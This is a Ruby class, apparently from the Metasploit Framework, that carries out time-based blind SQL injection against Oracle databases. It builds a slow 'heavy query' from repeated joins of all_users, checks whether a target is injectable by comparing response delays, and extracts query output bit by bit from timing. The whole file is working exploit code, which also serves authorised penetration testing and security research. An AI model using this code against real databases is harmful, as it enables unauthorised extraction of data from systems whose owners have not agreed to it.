#
#   Time-Based Blind SQL injection support for Oracle Database
#
class Msf::Exploit::SQLi::Oraclei::TimeBasedBlind < Msf::Exploit::SQLi::Oraclei::Common
  HEAVYQUERY_DETECTION_SAMPLE = 10 # number of times to check if the block takes a delay of @sleepdelay

  def initialize(datastore, framework, user_output, opts = {}, &query_proc)
    @sleepdelay = datastore['SqliDelay'] || 1
    super
    if opts[:heavyquery_parameter]
      @heavyquery_parameter = opts[:heavyquery_parameter]
    else
      detect_heavyquery_parameter
    end
  end

  def run_sql(query, output_charset = nil)
    if output_charset.is_a?(Range) && output_charset.count > 0
      known_bits, bits_to_guess = get_bitmask(output_charset)
    else
      known_bits = 0
      bits_to_guess = 8
    end
    vprint_status "{SQLi} Executing (#{query})"
    if @hex_encode_strings
      query = hex_encode_strings(query)
      vprint_status "{SQLi} Encoded to (#{query})"
    end
    # first, get the length of the output
    output_length = blind_detect_length(query, true)
    vprint_status "{SQLi} Time-based injection: expecting output of length #{output_length}"
    # now, get the output, of the given length
    blind_dump_data(query, output_length, known_bits, bits_to_guess, true)
  end

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true.
  #  @return [Boolean] whether the target is detected as vulnerable or not
  #
  def test_vulnerable
    # run_sql and check if output is what's expected, or just check for delays?
    out_true = blind_request("1=(select count(1) from #{@heavyquery_parameter}) and 1=1")
    out_false = blind_request("1=(select count(1) from #{@heavyquery_parameter}) and 1=2")
    out_true && !out_false
  end

  private

  def blind_request(query)
    time = Time.now
    @query_proc.call(query)
    diff = Time.now - time
    diff >= @sleepdelay
  end

  def detect_heavyquery_parameter
    # if there are 16 users, initially, this would return 65536 rows
    @heavyquery_parameter = 'all_users,all_users,all_users,all_users'
    loop do
      break if HEAVYQUERY_DETECTION_SAMPLE.times.all? { blind_request("1=(select count(1) from #{@heavyquery_parameter})") }

      # this would multiply the number of rows returned by 4
      @heavyquery_parameter += ',table(sys.odcinumberlist(1,2,3,4))'
    end
  end
end
